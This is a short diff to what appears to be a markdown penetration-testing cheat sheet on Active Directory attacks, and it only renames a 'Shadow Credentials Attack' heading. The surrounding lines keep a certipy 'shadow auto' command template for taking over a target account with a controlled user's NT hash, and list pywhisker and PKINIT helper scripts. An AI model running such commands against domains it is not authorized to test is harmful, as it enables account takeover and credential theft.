@@ -20,7 +20,7 @@ ____________________________________________________
 ` < kerberos sync clock command > ; certipy shadow auto -u <user you control>@<domain> -hashes :<your user NT hash here> -account <target user> `
 
 
-### SHADOW CREDENTIALS ATTACK (old school method, with pywisker):
+### SHADOW CREDENTIALS ATTACK (with pywisker):
 
  * REQUIREMENTS: Get pywhisker, "gettgtpkinit.py" and "getnthash.py" from this repositoris:
    
